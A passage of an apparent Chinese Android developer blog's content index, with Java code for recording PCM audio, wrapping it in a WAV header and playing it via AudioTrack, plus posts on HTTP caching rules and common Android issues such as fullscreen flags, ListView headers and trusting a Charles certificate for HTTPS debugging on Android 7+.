(IOException e) &#123; throw new IllegalStateException(\"create file output stream fail with \" + e.toString()); &#125; if (queue == null) &#123; throw new IllegalArgumentException(\"queue can not be null\"); &#125; this.queue = queue; &#125; private PcmRecorder(int sampleRate, int channel, int bitWidth) &#123; this.sampleRate = sampleRate; this.channel = channel == 2 ? channel : 1; this.bitWidth = bitWidth == 8 ? bitWidth : 16; int channelConfig = channel == 2 ? AudioFormat.CHANNEL_IN_STEREO : AudioFormat.CHANNEL_IN_MONO; int audioFormat = bitWidth == 8 ? AudioFormat.ENCODING_PCM_8BIT : AudioFormat.ENCODING_PCM_16BIT; bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat); buffer = new byte[bufferSize]; Log.i(TAG, \"sampleRate : \" + sampleRate + \" channel : \" + channel + \" bitWidth : \" + bitWidth + \" bufferSize : \" + bufferSize); audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, bufferSize); Log.i(TAG, \"state : \" + audioRecord.getState()); HandlerThread workThread = new HandlerThread(\"recordThread\"); workThread.start(); workHandler = new RecordHandler(workThread.getLooper()); &#125; public int getSampleRate() &#123; return sampleRate; &#125; public int getChannel() &#123; return channel; &#125; public int getBitWidth() &#123; return bitWidth; &#125; synchronized void start() &#123; if (work) &#123; return; &#125; work = true; audioRecord.startRecording(); workHandler.sendEmptyMessage(0); &#125; synchronized void stop() &#123; if (!work) &#123; return; &#125; work = false; audioRecord.stop(); &#125; private class RecordHandler extends Handler &#123; RecordHandler(Looper looper) &#123; super(looper); &#125; @Override public void handleMessage(Message msg) &#123; super.handleMessage(msg); Log.i(TAG, \"work handler start\"); while (work) &#123; int result = audioRecord.read(buffer, 0, bufferSize); if (result == AudioRecord.ERROR_INVALID_OPERATION || result == AudioRecord.ERROR_BAD_VALUE) &#123; Log.e(TAG, \"record read fail ! just continue !\"); continue; &#125; Log.i(TAG, \"read result : \" + result); if (fos != null) &#123; try &#123; fos.write(buffer, 0, result); fos.flush(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; &#125; if (queue != null) &#123; boolean offerResult = queue.offer(buffer); Log.i(TAG, \"offerResult \" + offerResult + \" queue size \" + queue.size()); &#125; &#125; if (fos != null) &#123; try &#123; fos.close(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; &#125; Log.i(TAG, \"work handler finish\"); &#125; &#125;&#125; 说明一下构造函数中需要的几个参数，顺便回顾下一些音频相关的参数知识： sampleRate：采样率，表示每秒的采样点数，根据Android官方文档，目前44.1K是保证在所有设备上都能运行的采样率（详见AudioRecord构造函数doc） channel：声道，Android支持单声道（AudioFormat#CHANNEL_IN_MONO表示）或双声道（AudioFormat#CHANNEL_IN_STEREO表示） bitWidth：位宽，表示每个采样点的存储大小，一般为8bit（AudioFormat#ENCODING_PCM_8BIT表示）或16bit（AudioFormat#ENCODING_PCM_16BIT表示） fileOutputPath：输出文件路径 queue：存放PCM数据的阻塞队列，用于配合进行Aac编码 需要值得注意的是，当我们需要计算录音时长时，通过记录一个起始录音时间点，再通过当前录音时间点相减的方式并不可靠（大致原因是AudioRecord#start调用后其实并没有马上开始录音）比较好的方法时通过 采样率的公式来计算录音时长，具体代码如下： 1234/** * 采样率 = 采样数 / 时间 = （数据总大小 / 位宽 / 声道数） / 时间**/time = data.length / bitWidth / channel / sampleRate; 通过为PCM格式文件添加头数据，封装为WAV格式在录制完PCM文件后，我们可以通过为其添加文件头，使其变成可以被播放器播放的WAV格式 文件头介绍：https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E5%A4%B4WAV格式文件头详细介绍：http://soundfile.sapp.org/doc/WaveFormat/大小端介绍：https://baike.baidu.com/item/%E5%A4%A7%E5%B0%8F%E7%AB%AF%E6%A8%A1%E5%BC%8F/6750542?fromtitle=%E5%A4%A7%E7%AB%AF%E5%B0%8F%E7%AB%AF&amp;fromid=15925891&amp;fr=aladdin 具体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108/** * Created by superxlcr on 2019/3/17. */public class WavEncoder &#123; private static final int HEADER_SIZE = 44; private int sampleRate; private int channel; private int bitWidth; WavEncoder(int sampleRate, int channel, int bitWidth) &#123; this.sampleRate = sampleRate; this.channel = (channel == 1 ? 1 : 2); this.bitWidth = bitWidth; &#125; void encode(File pcmFile, File wavFile) &#123; try &#123; FileInputStream fis = new FileInputStream(pcmFile); FileOutputStream fos = new FileOutputStream(wavFile); fos.write(buildHeader((int) fis.getChannel().size()), 0, HEADER_SIZE); byte data[] = new byte[1024]; int len; while ((len = fis.read(data)) != -1) &#123; fos.write(data, 0, len); &#125; fis.close(); fos.flush(); fos.close(); &#125; catch (IOException e) &#123; throw new IllegalStateException(\"encode with exception : \" + e.toString()); &#125; &#125; private byte[] buildHeader(int audioSize) &#123; byte header[] = new byte[HEADER_SIZE]; int i = 0; // chunk id : big-endian header[i++] = 'R'; header[i++] = 'I'; header[i++] = 'F'; header[i++] = 'F'; // chunk size : little-endian int dataSize = audioSize + 36; header[i++] = (byte) (dataSize &amp; 0xff); header[i++] = (byte) ((dataSize &gt;&gt;&gt; 8) &amp; 0xff); header[i++] = (byte) ((dataSize &gt;&gt;&gt; 16) &amp; 0xff); header[i++] = (byte) ((dataSize &gt;&gt;&gt; 24) &amp; 0xff); // format : big-endian header[i++] = 'W'; header[i++] = 'A'; header[i++] = 'V'; header[i++] = 'E'; // sub chunk 1 id : big-endian header[i++] = 'f'; header[i++] = 'm'; header[i++] = 't'; header[i++] = ' '; // sub chunk 1 size : little-endian // 16 for pcm header[i++] = 16; header[i++] = 0; header[i++] = 0; header[i++] = 0; // audio format : little-endian // 1 for linear quantization pcm header[i++] = 1; header[i++] = 0; // num channels : little-endian // just mono or stereo header[i++] = (byte) channel; header[i++] = 0; // sample rate : little-endian header[i++] = (byte) (sampleRate &amp; 0xff); header[i++] = (byte) ((sampleRate &gt;&gt;&gt; 8) &amp; 0xff); header[i++] = (byte) ((sampleRate &gt;&gt;&gt; 16) &amp; 0xff); header[i++] = (byte) ((sampleRate &gt;&gt;&gt; 24) &amp; 0xff); // byte rate : little-endian int byteRate = sampleRate * channel * bitWidth / 8; header[i++] = (byte) (byteRate &amp; 0xff); header[i++] = (byte) ((byteRate &gt;&gt;&gt; 8) &amp; 0xff); header[i++] = (byte) ((byteRate &gt;&gt;&gt; 16) &amp; 0xff); header[i++] = (byte) ((byteRate &gt;&gt;&gt; 24) &amp; 0xff); // block align : little-endian header[i++] = (byte) (channel * bitWidth / 8); header[i++] = 0; // bit per sample : little-endian header[i++] = (byte) bitWidth; header[i++] = 0; // sub chunk 2 id : big-endian header[i++] = 'd'; header[i++] = 'a'; header[i++] = 't'; header[i++] = 'a'; // sub chunk 2 size : little-endian header[i++] = (byte) (audioSize &amp; 0xff); header[i++] = (byte) ((audioSize &gt;&gt;&gt; 8) &amp; 0xff); header[i++] = (byte) ((audioSize &gt;&gt;&gt; 16) &amp; 0xff); header[i++] = (byte) ((audioSize &gt;&gt;&gt; 24) &amp; 0xff); if (i != 44) &#123; throw new IllegalStateException(\"the header size is not \" + HEADER_SIZE + \" ?!\"); &#125; return header; &#125;&#125; 值得注意的是，在WAV文件头中，字符串相关的参数均为大端模式，而数据类型的均为小端模式 使用系统AudioTrack API播放PCMAudioTrack官方文档：https://developer.android.com/reference/android/media/AudioTrack 相关代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123; private static final String TAG = \"MainActivity\"; private static final String RECORD_FILE_DIR_PATH = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + \"recodeDir\" + File.separator; private static final String RECORD_FILE_PATH = RECORD_FILE_DIR_PATH + \"record\"; private static final String RECORD_FILE_WAV_PATH = RECORD_FILE_DIR_PATH + \"record_wav.wav\"; private static final String PLAY_FILE_PATH = RECORD_FILE_DIR_PATH + \"play\"; private static final String RECORD_FILE_AAC_PATH = RECORD_FILE_DIR_PATH + \"record_aac.aac\"; private PcmRecorder pcmRecorder; private AacEncoder aacEncoder; private WavEncoder wavEncoder; private BlockingQueue&lt;byte[]&gt; queue = new ArrayBlockingQueue&lt;&gt;(100); private AudioTrack audioTrack; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); findViewById(R.id.start_btn).setOnClickListener(this); findViewById(R.id.stop_btn).setOnClickListener(this); findViewById(R.id.play_btn).setOnClickListener(this); new File(RECORD_FILE_DIR_PATH).mkdirs(); pcmRecorder = new PcmRecorder(44100, 2, 16, RECORD_FILE_PATH, queue); aacEncoder = new AacEncoder(queue, RECORD_FILE_AAC_PATH, pcmRecorder.getSampleRate(), pcmRecorder.getChannel(), pcmRecorder.getBitWidth(), null); wavEncoder = new WavEncoder(pcmRecorder.getSampleRate(), pcmRecorder.getChannel(), pcmRecorder.getBitWidth()); &#125; @SuppressLint(\"StaticFieldLeak\") @Override public void onClick(View v) &#123; switch (v.getId()) &#123; case R.id.start_btn: pcmRecorder.start(); aacEncoder.start(); break; case R.id.stop_btn: pcmRecorder.stop(); aacEncoder.stop(); wavEncoder.encode(new File(RECORD_FILE_PATH), new File(RECORD_FILE_WAV_PATH)); break; case R.id.play_btn: if (audioTrack != null) &#123; Toast.makeText(this, \"playing...\", Toast.LENGTH_SHORT).show(); return; &#125; new AsyncTask&lt;Void, Void, Void&gt;() &#123; @Override protected Void doInBackground(Void... voids) &#123; try &#123; File playFile = new File(RECORD_FILE_PATH); FileInputStream fis = new FileInputStream(playFile); int bufferSize = AudioTrack.getMinBufferSize( pcmRecorder.getSampleRate(), pcmRecorder.getChannel() == 1 ? AudioFormat.CHANNEL_OUT_MONO : AudioFormat.CHANNEL_OUT_STEREO, pcmRecorder.getBitWidth() == 8 ? AudioFormat.ENCODING_PCM_8BIT : AudioFormat.ENCODING_PCM_16BIT); audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC, pcmRecorder.getSampleRate(), pcmRecorder.getChannel() == 1 ? AudioFormat.CHANNEL_OUT_MONO : AudioFormat.CHANNEL_OUT_STEREO, pcmRecorder.getBitWidth() == 8 ? AudioFormat.ENCODING_PCM_8BIT : AudioFormat.ENCODING_PCM_16BIT, bufferSize, AudioTrack.MODE_STREAM); audioTrack.play(); byte buffer[] = new byte[bufferSize]; int len; while ((len = fis.read(buffer, 0, buffer.length)) != -1) &#123; audioTrack.write(buffer, 0, len); &#125; fis.close(); audioTrack.play(); &#125; catch (IOException e) &#123; throw new RuntimeException(\"ioException : \" + e.toString()); &#125; Log.i(TAG, \"write finish !\"); return null; &#125; @Override protected void onPostExecute(Void aVoid) &#123; new Handler().postDelayed(new Runnable() &#123; @Override public void run() &#123; Log.i(TAG, \"audio track stop\"); audioTrack.stop(); audioTrack = null; &#125; &#125;, 5000); &#125; &#125;.execute(); break; &#125; &#125;&#125; 值得注意的是，AudioTrack支持两种播放模式，这里用的是AudioTrack#MODE_STREAM模式 MODE_STREAM：在这种模式下，通过write一次次把音频数据写到AudioTrack中。这和平时通过write系统调用往文件中写数据类似，但这种工作方式每次都需要把数据从用户提供的Buffer中拷贝到AudioTrack内部的Buffer中，这在一定程度上会使引入延时。为解决这一问题，AudioTrack就引入了第二种模式。 MODE_STATIC：这种模式下，在play之前只需要把所有数据通过一次write调用传递到AudioTrack中的内部缓冲区，后续就不必再传递数据了。这种模式适用于像铃声这种内存占用量较小，延时要求较高的文件。但它也有一个缺点，就是一次write的数据不能太多，否则系统无法分配足够的内存来存储全部数据。 xml文件相对简单，这里不贴出来了，测试时注意申请相关权限 123&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt;&lt;uses-permission android:name=\"android.permission.RECORD_AUDIO\" /&gt;","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"音视频","slug":"音视频","permalink":"https://superxlcr.github.io/tags/音视频/"}]},{"title":"HTTP缓存原理","slug":"HTTP缓存原理","date":"2019-05-16T11:19:47.000Z","updated":"2020-05-11T07:23:44.684Z","comments":true,"path":"2019/05/16/HTTP缓存原理/","link":"","permalink":"https://superxlcr.github.io/2019/05/16/HTTP缓存原理/","excerpt":"","text":"HTTP报文在介绍HTTP缓存之前，作为知识铺垫，先简单介绍一下HTTP报文HTTP报文就是浏览器和服务器间通信时发送及响应的数据块。浏览器向服务器请求数据，发送请求(request)报文；服务器向浏览器返回数据，返回响应(response)报文。报文信息主要分为两部分 包含属性的首部(header)：附加信息（cookie，缓存信息等）与缓存相关的规则信息，均包含在header中 包含数据的主体部分(body)：HTTP请求真正想要传输的部分 缓存规则解析为方便大家理解，我们认为浏览器存在一个缓存数据库，用于存储缓存信息。在客户端第一次请求数据时，此时缓存数据库中没有对应的缓存数据，需要请求服务器，服务器返回后，将数据存储至缓存数据库中。 HTTP缓存有多种规则，根据是否需要重新向服务器发起请求来分类，我将其分为两大类(强制缓存，对比缓存)在详细介绍这两种规则之前，先通过时序图的方式，让大家对这两种规则有个简单了解。 已存在缓存数据时，仅基于强制缓存，请求数据的流程如下 已存在缓存数据时，仅基于对比缓存，请求数据的流程如下 我们可以看到两类缓存规则的不同，强制缓存如果生效，不需要再和服务器发生交互，而对比缓存不管是否生效，都需要与服务端发生交互。当两类缓存规则同时存在时，强制缓存优先级高于对比缓存，也就是说，当执行强制缓存的规则时，如果缓存生效，直接使用缓存，不再执行对比缓存规则。 强制缓存从上文我们得知，强制缓存，在缓存数据未失效的情况下，可以直接使用缓存数据，那么浏览器是如何判断缓存数据是否失效呢？我们知道，在没有缓存数据的时候，浏览器向服务器请求数据时，服务器会将数据和缓存规则一并返回，缓存规则信息包含在响应header中。 对于强制缓存来说，响应header中会有两个字段来标明失效规则（Expires/Cache-Control）使用chrome的开发者工具，可以很明显的看到对于强制缓存生效时，网络请求的情况 Expires（绝对时间）Expires的值为服务端返回的到期时间，即下一次请求时，请求时间小于服务端返回的到期时间，直接使用缓存数据。不过Expires 是HTTP 1.0的东西，现在默认浏览器均默认使用HTTP 1.1，所以它的作用基本忽略。它主要的问题是，到期时间是由服务端生成的，但是客户端时间可能跟服务端时间有误差，而且客户端的本地时间有可能会被修改，这就会导致缓存命中的误差。所以HTTP 1.1 的版本，使用Cache-Control替代。 Cache-Control（相对时间）Cache-Control 是最重要的规则。常见的取值有private、public、no-cache、max-age，no-store，默认为private。 private: 客户端可以缓存 public: 客户端和代理服务器都可缓存（前端的同学，可以认为public和private是一样的） max-age=xxx: 缓存的内容将在 xxx 秒后失效 no-cache: 需要使用对比缓存来验证缓存数据 no-store: 所有内容都不会缓存，强制缓存，对比缓存都不会触发（对于前端开发来说，缓存越多越好，so…基本上和它说886） 例子： 图中Cache-Control仅指定了max-age，所以默认为private，缓存时间为31536000秒（365天）也就是说，在365天内再次请求这条数据，都会直接获取缓存数据库中的数据，直接使用。 对比缓存对比缓存，顾名思义，需要进行比较判断是否可以使用缓存。浏览器第一次请求数据时，服务器会将缓存标识与数据一起返回给客户端，客户端将二者备份至缓存数据库中。再次请求数据时，客户端将备份的缓存标识发送给服务器，服务器根据缓存标识进行判断，判断成功后，返回304状态码，通知客户端比较成功，可以使用缓存数据。 第一次访问： 再次访问： 通过两图的对比，我们可以很清楚的发现，在对比缓存生效时，状态码为304，并且报文大小和请求时间大大减少。原因是，服务端在进行标识比较后，只返回header部分，通过状态码通知客户端使用缓存，不再需要将报文主体部分返回给客户端。 对于对比缓存来说，缓存标识的传递是我们着重需要理解的，它在请求header和响应header间进行传递，一共分为两种标识传递，接下来，我们分开介绍。 Last-Modified/If-Modified-SinceLast-Modified：服务器在响应请求时，告诉浏览器资源的最后修改时间。 If-Modified-Since：再次请求服务器时，通过此字段通知服务器上次请求时，服务器返回的资源最后修改时间。服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若资源的最后修改时间大于If-Modified-Since，说明资源又被改动过，则响应整片资源内容，返回状态码200；若资源的最后修改时间小于或等于If-Modified-Since，说明资源无新修改，则响应HTTP 304，告知浏览器继续使用所保存的cache。 Etag/If-None-Match同时启用的情况下，Etag/If-None-Match优先级高于Last-Modified/If-Modified-Since Etag：服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器决定）。 If-None-Match：再次请求服务器时，通过此字段通知服务器客户段缓存数据的唯一标识。服务器收到请求后发现有头If-None-Match 则与被请求资源的唯一标识进行比对，不同，说明资源又被改动过，则响应整片资源内容，返回状态码200；相同，说明资源无新修改，则响应HTTP 304，告知浏览器继续使用所保存的cache。 总结对于强制缓存，服务器通知浏览器一个缓存时间，在缓存时间内，下次请求，直接用缓存，不在时间内，执行比较缓存策略。对于比较缓存，将缓存信息中的Etag和Last-Modified通过请求发送给服务器，由服务器校验，返回304状态码时，浏览器直接使用缓存。 浏览器第一次请求： 浏览器再次请求时：","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"Http","slug":"Http","permalink":"https://superxlcr.github.io/tags/Http/"}]},{"title":"Android常见问题总结（八）","slug":"Android常见问题总结（八）","date":"2019-05-06T06:13:12.000Z","updated":"2020-05-11T07:23:44.581Z","comments":true,"path":"2019/05/06/Android常见问题总结（八）/","link":"","permalink":"https://superxlcr.github.io/2019/05/06/Android常见问题总结（八）/","excerpt":"","text":"上一篇博客传送门：Android常见问题总结（七） Android全屏方式对比博主目前发现两种在Android中实现全屏的方案，分别是： 通过 View#setSystemUiVisibility 方法，使用 View#SYSTEM_UI_FLAG_FULLSCREEN 通过 Window#addFlags 方法，使用 WindowManager.LayoutParams#FLAG_FULLSCREEN 两者在视觉效果上并没有什么不同，其中，View#SYSTEM_UI_FLAG_FULLSCREEN 说明如下： 12345678910111213141516171819202122232425262728293031323334/** * Flag for &#123;@link #setSystemUiVisibility(int)&#125;: View has requested to go * into the normal fullscreen mode so that its content can take over the screen * while still allowing the user to interact with the application. * * &lt;p&gt;This has the same visual effect as * &#123;@link android.view.WindowManager.LayoutParams#FLAG_FULLSCREEN * WindowManager.LayoutParams.FLAG_FULLSCREEN&#125;, * meaning that non-critical screen decorations (such as the status bar) will be * hidden while the user is in the View's window, focusing the experience on * that content. Unlike the window flag, if you are using ActionBar in * overlay mode with &#123;@link Window#FEATURE_ACTION_BAR_OVERLAY * Window.FEATURE_ACTION_BAR_OVERLAY&#125;, then enabling this flag will also * hide the action bar. * * &lt;p&gt;This approach to going fullscreen is best used over the window flag when * it is a transient state -- that is, the application does this at certain * points in its user interaction where it wants to allow the user to focus * on content, but not as a continuous state. For situations where the application * would like to simply stay full screen the entire time (such as a game that * wants to take over the screen), the * &#123;@link android.view.WindowManager.LayoutParams#FLAG_FULLSCREEN window flag&#125; * is usually a better approach. The state set here will be removed by the system * in various situations (such as the user moving to another application) like * the other system UI states. * * &lt;p&gt;When using this flag, the application should provide some easy facility * for the user to go out of it. A common example would be in an e-book * reader, where tapping on the screen brings back whatever screen and UI * decorations that had been hidden while the user was immersed in reading * the book. * * @see #setSystemUiVisibility(int) */ 主要需要注意的细节有这种方式实现的全屏效果是短暂的（transient），会因为用户的某些操作（如：跳转到其他应用，下拉状态栏等）退出全屏模式 而 WindowManager.LayoutParams#FLAG_FULLSCREEN 说明如下： 1234567891011121314151617181920/** * Window flag: hide all screen decorations (such as the status bar) while * this window is displayed. This allows the window to use the entire * display space for itself -- the status bar will be hidden when * an app window with this flag set is on the top layer. A fullscreen window * will ignore a value of &#123;@link #SOFT_INPUT_ADJUST_RESIZE&#125; for the window's * &#123;@link #softInputMode&#125; field; the window will stay fullscreen * and will not resize. * * &lt;p&gt;This flag can be controlled in your theme through the * &#123;@link android.R.attr#windowFullscreen&#125; attribute; this attribute * is automatically set for you in the standard fullscreen themes * such as &#123;@link android.R.style#Theme_NoTitleBar_Fullscreen&#125;, * &#123;@link android.R.style#Theme_Black_NoTitleBar_Fullscreen&#125;, * &#123;@link android.R.style#Theme_Light_NoTitleBar_Fullscreen&#125;, * &#123;@link android.R.style#Theme_Holo_NoActionBar_Fullscreen&#125;, * &#123;@link android.R.style#Theme_Holo_Light_NoActionBar_Fullscreen&#125;, * &#123;@link android.R.style#Theme_DeviceDefault_NoActionBar_Fullscreen&#125;, and * &#123;@link android.R.style#Theme_DeviceDefault_Light_NoActionBar_Fullscreen&#125;.&lt;/p&gt; */ 主要需要注意的是跟软键盘弹出的一些交互问题 ListView的Header与Footer设置Visibility为Gone不起作用常用的ViewGroup，例如LinearLayout，在onMeasure方法内对每个child view执行measure前，会判断child view的visibility是否为gone。如果是gone，则不对这个child view执行measure操作，即这个child view的高度不被计算在linearLayout的高度里面。LinearLayout的measureVertical代码片段 1234567891011121314151617181920212223void measureVertical(int widthMeasureSpec, int heightMeasureSpec) &#123; ... // See how tall everyone is. Also remember max width. for (int i = 0; i &lt; count; ++i) &#123; final View child = getVirtualChildAt(i); if (child == null) &#123; mTotalLength += measureNullChild(i); continue; &#125; if (child.getVisibility() == View.GONE) &#123; i += getChildrenSkipCount(child, i); continue; &#125; ... i += getChildrenSkipCount(child, i); &#125; ...&#125; view在measure自己时，并不会去判断自己的Visibility是GONE。这个逻辑操作如上述代码所示，是在parent view里面做的。所以当对LinearLayout里面的一个childView设置Visiblility为gone时，这个view不会被measure，最终也不会被显示出来。 在使用ListView时，经常会添加一些headerView、footerView。但是当设置headerView、footerView的visibility为gone时，却发现headerView、footerView虽然没有显示出来，但垂直方向其所占的位置还是被显示出来了，从而出现了空白区域。网上查到的解决办法是：不能直接设置headerView、footerView的Visibility为gone。而是要在HeaderView、FooterView外面包一层parent view（FrameLayout RelativeLayout 都可以），并设置layout_height=“wrap_content”。然后对里面的childView设置visibility为GONE、VISIBLE都会生效。查看源码，情况确实如此。 ListView的onMeasure里面，如果ListView的widthMode、heightMode有一个是unspecified时（应该对应于在XML中没有对listView设置layout_width、layout_height），会调用方法measureScrapChild。如果没有unspecified的情况，则会调用measureHeightOfChildren方法，而此方法内部也会调用measureScrapChild方法。查看measureScrapChild方法: 12345678910111213141516171819202122232425private void measureScrapChild(View child, int position, int widthMeasureSpec, int heightHint) &#123; LayoutParams p = (LayoutParams) child.getLayoutParams(); if (p == null) &#123; p = (AbsListView.LayoutParams) generateDefaultLayoutParams(); child.setLayoutParams(p); &#125; p.viewType = mAdapter.getItemViewType(position); p.isEnabled = mAdapter.isEnabled(position); p.forceAdd = true; final int childWidthSpec = ViewGroup.getChildMeasureSpec(widthMeasureSpec, mListPadding.left + mListPadding.right, p.width); final int lpHeight = p.height; final int childHeightSpec; if (lpHeight &gt; 0) &#123; childHeightSpec = MeasureSpec.makeMeasureSpec(lpHeight, MeasureSpec.EXACTLY); &#125; else &#123; childHeightSpec = MeasureSpec.makeSafeMeasureSpec(heightHint, MeasureSpec.UNSPECIFIED); &#125; child.measure(childWidthSpec, childHeightSpec); // Since this view was measured directly aginst the parent measure // spec, we must measure it again before reuse. child.forceLayout();&#125; 可以看出，listview在对child view执行measure前，没有判断visibility为gone的情况。再看看里面的详细逻辑： lpHeight&gt;0时，说明在xml或者程序里面设置了一个确定的尺寸，这里没有问题 else里面，设置mode为UNSPECIFIED，就是让child view自己去决定大小，child view在measure自己时，不会考虑VISIBILITY属性 如果外面包一层parent view（例如LinearLayout），并设置layout_height为wrap_content(按上面的分析，设置match_parent也是可以的），listView会调用调用额外的这个parent view的measure方法。而LinearLayout在measure时，会判断child view的visibility，如果为gone，则会返回0。最终这个额外的parent view返回给list view的尺寸就是0，从而解决了空白区域的问题 ViewGroup没有调用onDraw方法结论：经测试得知，在没有background背景的情况下，ViewGroup并不会执行onDraw绘制 View#draw相关代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253@CallSuperpublic void draw(Canvas canvas) &#123; final int privateFlags = mPrivateFlags; final boolean dirtyOpaque = (privateFlags &amp; PFLAG_DIRTY_MASK) == PFLAG_DIRTY_OPAQUE &amp;&amp; (mAttachInfo == null || !mAttachInfo.mIgnoreDirtyState); mPrivateFlags = (privateFlags &amp; ~PFLAG_DIRTY_MASK) | PFLAG_DRAWN; /* * Draw traversal performs several drawing steps which must be executed * in the appropriate order: * * 1. Draw the background * 2. If necessary, save the canvas' layers to prepare for fading * 3. Draw view's content * 4. Draw children * 5. If necessary, draw the fading edges and restore layers * 6. Draw decorations (scrollbars for instance) */ // Step 1, draw the background, if needed int saveCount; if (!dirtyOpaque) &#123; drawBackground(canvas); &#125; // skip step 2 &amp; 5 if possible (common case) final int viewFlags = mViewFlags; boolean horizontalEdges = (viewFlags &amp; FADING_EDGE_HORIZONTAL) != 0; boolean verticalEdges = (viewFlags &amp; FADING_EDGE_VERTICAL) != 0; if (!verticalEdges &amp;&amp; !horizontalEdges) &#123; // Step 3, draw the content if (!dirtyOpaque) onDraw(canvas); // Step 4, draw the children dispatchDraw(canvas); ... // we're done... return; &#125; ... // Step 3, draw the content if (!dirtyOpaque) onDraw(canvas); // Step 4, draw the children dispatchDraw(canvas); ...&#125; 可以看到想要执行onDraw，我们都需要变量dirtyOpaque为false（这个变量的具体逻辑没有追踪，大意应该是需要有内容进行绘制吧，所以我们需要添加一个背景）又或者我们可以重写方法dispatchDraw，这个是一定会执行的 ViewPager获取当前显示的Fragment最近博主使用到了ViewPager与Fragment这一经典的组合，在此记录一下如何在ViewPager中获取当前显示的Fragment FragmentManager#findFragmentByTag当我们使用Viewpager + FragmentPagerAdapter的组合时，加载过的Fragment都会被保留，因此我们可以通过 FragmentManager#findFragmentByTag 来获取相应的 Fragment根据网上相关的资料以及翻看源码，我们可以使用 FragmentPagerAdapter#makeFragmentName 来获取相应的 tag (该方法是private的，我们可以拷贝出来使用) 具体的源码如下所示： 12345678910111213141516/** * Return a unique identifier for the item at the given position. * * &lt;p&gt;The default implementation returns the given position. * Subclasses should override this method if the positions of items can change.&lt;/p&gt; * * @param position Position within this adapter * @return Unique identifier for the item at position */public long getItemId(int position) &#123; return position;&#125;private static String makeFragmentName(int viewId, long id) &#123; return \"android:switcher:\" + viewId + \":\" + id;&#125; PS：FragmentPagerAdapter#makeFragmentName 这个方法是 private 的，直接调用或者copy并不是非常保险，比较好的做法是把整个FragmentPagerAdapter都拷贝出去 重写FragmentPagerAdapter#setPrimaryItem这个方法在每次viewpager滑动后都会被调用，而object参数就是显示的Fragment我们可以通过重写该方法，把object存到我们的成员变量中随时读取不过这种方式有一个缺陷，FragmentPagerAdapter#setPrimaryItem是在 viewpager的滑动监听执行完后才会调用的，因此我们在滑动监听中读取的当前Fragment是不正确的 Android 7.0 https 抓包问题当我们使用Fiddler或者Charles等工具，想要在Android手机上抓包https请求时，我们需要把他们的证书安装到手机上，让手机能与抓包工具正确建立https连接然而这个方式在Android 7.0 以上的版本却失效了，博主亲测像往常安装证书之后还是不能抓包https请求具体的原因可以参考官方的文档：https://developer.android.com/training/articles/security-config.html 简单来说，就是因为官方的检验机制变得更加严格了，虽然我们安装了相应的用户证书，但应用仍然是不信任我们的证书的要解决这个问题，根据官方文档： 我们需要把我们的证书放置/res/raw目录下 我们需要在/res/xml新建一个network_security_config.xml，来配置证书 在AndroidManifest.xml上应用此配置 network_security_config.xml： 123456789&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;network-security-config&gt; &lt;base-config&gt; &lt;trust-anchors&gt; &lt;certificates src=\"@raw/charles证书\" /&gt; &lt;certificates src=\"system\" /&gt; &lt;/trust-anchors&gt; &lt;/base-config&gt;&lt;/network-security-config&gt; AndroidManifest.xml： 123&lt;application android:networkSecurityConfig=\"@xml/network_security_config\" ...&gt;","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"关于一些基础的Java问题的解答（十）","slug":"关于一些基础的Java问题的解答（十）","date":"2019-05-06T03:18:10.000Z","updated":"2020-05-28T02:39:18.351Z","comments":true,"path":"2019/05/06/关于一些基础的Java问题的解答（十）/","link":"","permalink":"https://superxlcr.github.io/2019/05/06/关于一些基础的Java问题的解答（十）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（九） 